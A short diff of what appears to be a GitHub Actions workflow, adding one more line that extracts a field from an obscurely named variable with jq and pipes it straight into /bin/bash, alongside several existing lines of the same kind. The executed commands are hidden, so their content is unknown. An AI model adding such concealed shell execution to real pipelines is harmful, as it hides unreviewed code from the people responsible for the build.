@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$acs04" | jq -r .fe2 | /bin/bash
           echo $wxyp051 | jq -r .prbxh748 | /bin/bash
           echo $tenm77290 | jq -r .texk56 | /bin/bash
+          echo $ykvax30 | jq -r .v85507 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
